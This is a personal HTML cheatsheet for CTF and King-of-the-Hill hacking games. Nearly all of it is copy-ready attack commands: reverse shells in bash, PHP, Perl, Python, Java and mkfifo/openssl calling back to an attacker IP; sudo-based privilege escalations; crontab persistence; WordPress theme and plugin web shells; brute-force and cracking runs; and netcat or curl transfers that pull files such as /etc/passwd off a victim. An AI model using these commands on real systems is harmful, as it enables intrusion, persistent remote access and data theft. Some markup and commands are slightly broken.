<h1>PFORM - CTF / KOTH - Cheatsheet</h1><br><br>

<br><h2>RECON</h2> 

<b>pform@attacker~: </b><code>rustscan -A 10.10.20.20</code>

<b>pform@attacker~: </b><code>sudo nmap -Pn -sV -sC -oN nmap.log 10.10.20.20</code>

<b>pform@attacker~: </b><code>lin4enum 10.10.20.20</code>

<b>pform@attacker~: </b><code>gobuster -dir -e php,html,htm,txt,log,conf,flag -u http://10.10.20.20 -w /usr/share/wordlists/directory-list-2.3-medium.txt</code>

<b>pform@attacker~: </b><code>wfuzz -w /usr/share/wordlists/directory-list-2.3-medium.txt -c --hc 404 http://10.10.20.20/FUZZ</code>

<b>pform@attacker~: </b><code>nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host 10.10.20.20</code>


<h2>SMB</h2>

<b>pform@attacker~: </b><code>sudo nmap --script smb-enum-shares.nse -p445 10.10.20.20</code>

<b>pform@attacker~: </b><code>sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 10.10.20.20</code>

<b>pform@attacker~: </b><code>smbmap -H 10.10.20.20</code>

<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.20.20</code>

<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.20.20\\C$ -U guest -W WORKGROUP</code>

<b>Download :</b> <code>get</code>

<b>Upload :</b> <code>put</code>

<br>
<h2>Mount smb share</h2>

<b>pform@attacker~: </b><code>smbmount "\\\\10.10.20.20\\super-secret-folder" -U hacked-account -c 'mount /mnt/super-secret-folder/ -u 500 -g 100'</code>

<h2>Map out smb shares</h2>

<b>pform@attacker~: </b><code>smbmap -H 10.10.20.20</code>
<b>pform@attacker~: </b><code>smbmap -u hacked-account -p supersecretpassword123 -d workgroup -H 10.10.20.20</code>



<h2>FTP</h2>

Is the host vuln to anonymous login?

<b>pform@attacker~: </b><code>ftp 10.10.20.20</code>

<b>pform@attacker~: </b>Login: <code>anonymous</code> Password: <code>anonymous</code>

Dont forget to check for hidden directories like this:

<b>pform@attacker~: </b><code>ls -la</code>

drwxr-xr-x pform pform 0069 Dec 32 00:00 .

drwxr-xr-x pform pform 0069 Dec 32 20:00 ..

drwxr-xr-x pform pform 0069 Dec 32 00:00 ... <b>     < - - - - - - - - - - - - ( 3 dots )</b>

-rw-r--r-x pform pform 0069 Dec 32 00:00 random-stuff.txt

<b>Download :</b> get, or mget * (to download all files in folder)

<b>Upload :</b> <code>put</code>

<b>Upload :</b> <code>mget *</code> (Download all files in the folder)

<b>Read files :</b> <code>more</code>



<h2>RDP</h2>

I think remmina is slow, compared to xfreerdp. 

<b>+clipboard</b> makes it possible to copy from <b>attacker machine</b> to <b>victim machine</b>

<b>pform@attacker~: </b><code>xfreerdp +clipboard +window-drag /u:username /p:password /v:10.10.10.10</code>

<h2>SSH</h2>

<b>pform@attacker~: </b><code>ssh user@10.10.20.20 -p 22</code>

<b>pform@attacker~: </b><code>ssh -i id_rsa user@10.10.20.20 -p 22</code>


<h1>Listners</1>

<h2>NETCAT</h2>


<b>pform@attacker~: </b><code>nc -lnvp 5555</code>

<h2>PWNCAT</h2>


For more mer info on pwncat visit: <li>https://github.com/calebstewart/pwncat</li>

<code>git clone https://github.com/calebstewart/pwncat.git; cd pwncat</code>

<code>pwncat -l -p 5555</code>


I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload files like this:

<b>hacked-account@victim ~/</b><code></code>

Press<b>"CTRL+D"</b>

<b>pform@local~: </b><code>download /etc/passwd</code>

<b>pform@local~: </b><code>upload ~/super-ninja-scripts/hightech-privesc-0day.py</code>

Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.

<b>hacked-account@victim ~/</b><code></code>


<h1>Reverse-Shell</h1>

Pentestmonkey <li>http://pentestmonkey.net/</li>

<h2>Bash</h2>

Use this if you have direct access to console commands like whoami.

<code>/bin/bash -i >& /dev/tcp/10.10.10.10/5555</code>

You have to do it like this if you run it in on a wordpress site

<code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>


<h2>PHP</h2>


<code>php -r '$sock=fsockopen("10.10.10.10",5555);exec("/bin/sh -i <&3 >&3 2>&3");'</code>

<h2>Perl</h2>


<code>perl -e 'use Socket;$i="10.10.10.10";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code>
  
<h2>Python</h2>


<code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code>

<h2>mkfifo</h2>


<code>mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:5555 > /tmp/s 2> /dev/null; rm /tmp/s</code>

<h2>Java</h2>


<code>r = Runtime.getRuntime()</code>

<code>p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])</code>

<code>p.waitFor()</code>

This java reverse-shell works in Jenkins script console.



<h1>Privesc</h1>

<h2>Search programs to privesc</h2>

<b>hacked-account@victim~: </b><b><code>sudo -l</b></code> lists all commands your USER can use with SUDO permissions.

If user dont have premisions try:

Linpeas <li>https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</li>

LinEnum <li>https://github.com/rebootuser/LinEnum</li>

<b>hacked-account@victim~: </b><code>find / -perm -u=s -type f 2>/dev/null</code>

<b>hacked-account@victim~: </b><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</code>



<h1>GTFObins</h1>


Heres a lists of a few programs that can be used to privesc, for more check the link below.

<li>https://gtfobins.github.io/</li>


<h2>bash</h2>

<b>hacked-account@victim~: </b><code>sudo -u#-1 /bin/bash</code>

<b>hacked-account@victim~: </b><code>sudo bash -p</code>

<h2>vim</h2>

<b>hacked-account@victim~: </b><code>sudo vim</code> followed by <code>:!bash -p</code> ( -p flag make the progrom persist the root permision)

<h2>nmap</h2>

<b>hacked-account@victim~: </b><code>sudo nmap --interactive</code> followed by <code>!sh</code>

<h2>iftop</h2>

<b>hacked-account@victim:~: </b><code>sudo iftop</code> followed by <b>shift+!</b> and Command> <code>/bin/sh</code>

<h2>find</h2>

<b>hacked-account@victim~: </b><code>sudo find . -exec /bin/bash \; -quit</code>

<b>hacked-account@victim~: </b><code>sudo find /var/log -name messages -exec /bin/bash -i \;</code>

<h2>nano</h2>

<b>hacked-account@victim~: </b><code>sudo nano</code> The Press <b>"CTRL+R CTRL+X"</b><code>reset sh 1>&0 2>&0</code> Can edit the sudoers file

<h2>man</h2>

<b>hacked-account@victim~: </b><code>sudo man man </code>followed by <code>!/bin/bash</code>

<h2>awk</h2>

<b>hacked-account@victim~: </b><code>sudo awk 'BEGIN {system("/bin/bash")}'</code>

<h2>less</h2>

<b>hacked-account@victim~: </b><code>sudo less /etc/profile followed by !/bin/bash</code>

<b>hacked-account@victim~: </b><code>sudo less /var/log/messages followed by !/bin/bash</code>

<b>hacked-account@victim~: </b><code>sudo less</code> : <code>!/bin/sh -p</code> ( -p flag make the program persist the root permision)


<h2>ftp</h2>

<b>hacked-account@victim~: </b><code>sudo ftp</code>followed by <code>!/bin/sh</code>

<h2>more</h2>

<b>hacked-account@victim~: </b><code>TERM= sudo more /etc/profile</code> followed by <code>!/bin/sh</code>

<h2>zip</h2>

<b>hacked-account@victim~: </b><code>touch my-bum.txt</code>

<b>hacked-account@victim~: </b><code>sudo zip my-bum.zip my-bum.txt -T --unzip-command="sh -c /bin/bash"</code>

<h2>nc</h2>

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Run 

<b>pform@attacker~: </b><code>nc -l -p 5555</code> on the attacker box to receive the shell. This only works with netcat traditional.

<b>hacked-account@victim~: </b><code>RHOST=10.10.10.10</code>

<b>hacked-account@victim~: </b><code>RPORT=5555</code>

<b>hacked-account@victim~: </b><code>sudo nc -e /bin/sh $RHOST $RPORT</code>


<h2>Crontab</h2>

Check if you can view crontab :

<b>hacked-account@victim~: </b><code>cat /etc/crontab</code>

Do you see a script that is running that your user have premision to edit? If you do, replace the content with a bash reverse-shell:


<code>#!/bin/bash</code>

<code>bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>

First start listner

<b>pform@attacker~: </b><code>pwncat -l -p 5555</code>
 
Then you have to wait for the time as the script it setup to run at.

If you dont know how the time for crontab works, use the link below to find out.

<li>https://crontab.guru/</li>



<h1>Spawn TTY shell / Stablelize your Shell</h1>


<b>hacked-account@victim~: </b><code>python -c 'import pty; pty.spawn("/bin/sh")'</code>

<b>hacked-account@victim~: </b><code>echo os.system('/bin/bash')</code>

<b>hacked-account@victim~: </b><code>/bin/sh -i</code>

<b>hacked-account@victim~: </b><code>perl —e 'exec "/bin/sh";'</code>

<b>hacked-account@victim~: </b><code>perl: exec "/bin/sh";</code>

<b>hacked-account@victim~: </b><code>ruby: exec "/bin/sh"</code>

<b>hacked-account@victim~: </b><code>lua: os.execute('/bin/sh')</code>


<b>From rbash to bash</b> 

<b>hacked-account@victim~: </b><code>ssh user@10.10.10.10 -p 22 -t "bash -l"</code>


<b>From crontab to bash</b>

example 1.

First start listner
<b>pform@attacker~: </b><code>pwncat -l -p 5555</code>

<b>hacked-account@victim ~/ </b><code>echo ' * * * * * bash -i >& /dev/tcp/10.0.10.10/5555 0>&1' >> /etc/crontab</code>

Then you just have to look and wait in your lister terminal for 1 min.


<br><h1>Brute Force Logins</h1>

<br><b>Brute Force Wordpress Login with WPScan</b>

<b>pform@attacker~: </b><code>wpscan --url http://10.10.20.20/blog -U admin -P /opt/wordlists/rockyou.txt -t 20</code>

<b>Brute Force with Hydra</b>

<b>example - Jenkins</b>

<b>In this example we are passing the traffic over a SSH Tunnel on port : 4444
  
<b>pform@attacker~: </b><code>hydra -l admin -P /opt/wordlists/rockyou.txt 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError' -I -s 4444</code>

<b>example - SSH</b>

<b>pform@attacker~: </b><code>hydra -l admin -P /opt/wordlists/rockyou.txt ssh://10.10.20.20 -p 22</code>

<br><br><h1>Password Cracking</h1>

<b>ZIP</b>

<b>pform@attacker~: </b><code>fcrackzip -u -D -p /opt/wordlists/rockyou.txt zipfile-with-password.zip</code>

<b>or</b>

<b>pform@attacker~: </b><code>zip2john zip.zip > zip.hash</code>

<b>pform@attacker~: </b><code>john --format=PKZIP ziphash.txt</code>

<b>pform@attacker~: </b><code>john --wordlist /opt/wordlists/rockyou.txt hash.txt</code>

<b>PGP-Key</b>

Extract crackable hash

<b>pform@attacker~: </b><code>gpg2john wordlist > wordlisthash-from-file</code>

Crack Hash

<b>pform@attacker~: </b><code>john --format=gpg --wordlist=/opt/wordlists/rockyou.txt  wordlisthash-from-file</code>

<br><b>Crack sha512 (deafult unix root hash)</b>

<b>pform@attacker~: </b><code>hashcat -m 1800 -a 0 -o hash-found.txt userhash.txt /opt/wordlists/rockyou.txt</code>

<b>Crack SSH-Key</b>


<b>pform@attacker~: </b><code>ssh2john id_rsa_file >> extracted_hash</code>

<b>pform@attacker~: </b><code>john extracted_hash --wordlist=/opt/wordlists/rockyou.txt</code>

OBS! - Don´t foreget to chmod 600 on the id_rsa file



<b>Identify your hash</b>

example 1.

<b>pform@attacker~: </b><code>hash-identifier</code>

<b>PAST in you hash</b>

example 2.

<b>pform@attacker~: </b><code>john hash-file.txt</code>


<h1>Get Reverse-Shell in Wordpress</h1>


<h2>Wordpress example 1. - Using 404.php</h2>


The best thing is to edit the 404.php file for the theme in use or another theme thats not in use, to be more stealth, 

as it dont hang the hole wordpress site, if you need to check the site for more information.

<b>First you need so set up your listner:</b>

<b>pform@attacker~: </b><code>nc -lnvp 5555</code> or <code>pwncat -lp 5555</code>

Then to load the reverse-shell just visit: http://10.10.20.20/wordpress/wp-content/themes/twentytwenty/404.php


<h2>Wordpress example 2. - Using index.php</h2>


First you need so set up your listner:

<b>pform@attacker~: </b><code>nc -lnvp 5555</code> or <code>pwncat -lp 5555</code>

Edit the theme´s index.php file.

Between :

get_header(); ?>

<code>mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:5555 > /tmp/s 2> /dev/null; rm /tmp/s</code>

<div class="wrap">
  
<h2>Wordpress example 3. - Using Plugin Editor</h2>
 

After logging in to the admin panel open the Plugin editor, in the bottom of a plugin.

Add <code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>

<h2>Wordpress example 4. - Using header.php</h2>
  

Edit "header.php"

Under php tag

<code>echo system($ REQUESTS['cmd']);</code>

change request metod by left click

open upp burp and run command in the bottom of the page:

<code>cmd=whomai</code>

<code>cmd=/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>


<h1Random Tips and Tricks</h1>

<h2>SSH Tunneling</h2>


Tunnel traffic over ssh to your attacker machine so you can act as the machine you have ssh in to.

Example.

The victim box have access to a Jenkins server running on ip 172.17.0.2 port:8080.

<b>pform@attacker~: </b><code>ssh -L 4444:172.17.0.2:8080 hacked-account@10.10.20.20</code>

Now you just open your webbrowser and surf to: <code>http://localhost:4444/</code>

And you can access the server running Jenkins as it was on your localnetwork.

<br>

<h2>Change IP on all scripts in a folder</h2>


If you like me have a folders with reverse-shells and scripts for your CTF / Koth needs,

and your IP changes just before the game starts, and no script have the correct ip.

<b>pform@attacker~: </b><code>cd ~/super-ninja-scripts/</code>

<b>pform@attacker~script-folder/:<code>grep -rl 10.10.10.10 * | xargs sed -i 's/10.10.10.10/20.20.20.20/g'</code>

<b>In this example 10.10.10.10 is the old-ip and 20.20.20.20 is the new-ip.</b>


<h2>Portscan with Bash</h2>


<b>(Use bash to portscan new host thats only accesible from victim machine, with no other portscanner in reach.)</b>

<b>Open ports gives you back a "Done"</b>

<b>Closed ports give you back a "Connection refused"</b>

<b>hacked-account@victim ~/: <b/><code>for i in 79 80 81; do echo $i & bash -i >& /dev/tcp/10.10.20.20/$i 0>&1;done</code>

<h2>Portscan with Curl</h2>

<b>hacked-account@victim ~/: <b/><code>curl http://10.10.20.20:[1-6000]</code>

<h1>Transfer files</h1>


<h2>WGET</h2>


Run this in the folder you have the files you want to upload.

<b>pform@attacker~: </b><code>python -m SimpleHTTPServer 5555</code>

<b>pform@attacker~: </b><code>python3 -m http.server 5555</code>

The use wget to download the file like this:

<b>hacked-account@victim~: </b><code>wget 10.10.10.10:5555/super-privesc-0day.sh</code>

<h2>CURL</h2>


Run this in the folder you have the files you want to upload.

<b>pform@attacker~: </b><code>python -m SimpleHTTPServer 5555</code>

<b>pform@attacker~: </b><code>python3 -m http.server 5555</code>

The use curl to download the file like this:

<b>hacked-account@victim~: </b><code>curl 10.10.10.10:5555/super-privesc-0day.sh -o .hidden-file.sh</code>


<h2>With NETCAT</h2>


On receiving end:

<b>pform@attacker~: </b><code>nc -l 5555 > passwd</code>

On sending end:

<b>hacked-account@victim~: </b><code>cat passwd | nc 10.10.10.10 5555</code>

If you want to transfer from attacker to victim, just swich the commands.

<h2>With PWNCAT</h2>


I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload files like this:

<b>hacked-account@victim ~/</b><code></code>

Press<b>"CTRL+D"</b>

<b>pform@local~: </b><code>download /etc/passwd</code>

<b>pform@local~: </b><code>upload ~/super-ninja-scripts/hightech-privesc-0day.py</code>

Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.

<b>hacked-account@victim ~/</b><code></code>

